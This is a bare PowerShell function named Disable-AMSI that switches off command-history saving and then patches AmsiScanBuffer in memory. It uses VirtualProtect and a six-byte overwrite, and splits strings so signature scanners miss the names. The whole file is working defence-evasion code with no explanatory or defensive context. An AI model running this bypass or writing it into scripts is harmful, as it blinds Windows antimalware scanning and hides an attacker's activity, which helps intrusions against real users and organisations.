function Disable-AMSI
{
Set-PSReadlineOption -HistorySaveStyle SaveNothing

$AMSIBypass=@"
using System;
using System.Runtime.InteropServices;

public class foo {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $AMSIBypass

$l = [foo]::LoadLibrary("am" + "si.dll")
$a = [foo]::GetProcAddress($l, "Amsi" + "Scan" + "Buffer")
$p = 0
$null = [foo]::VirtualProtect($a, [uint32]5, 0x40, [ref]$p)
$pa = [Byte[]] (184, 87, 0, 7, 128, 195)
[System.Runtime.InteropServices.Marshal]::Copy($pa, 0, $a, 6)

}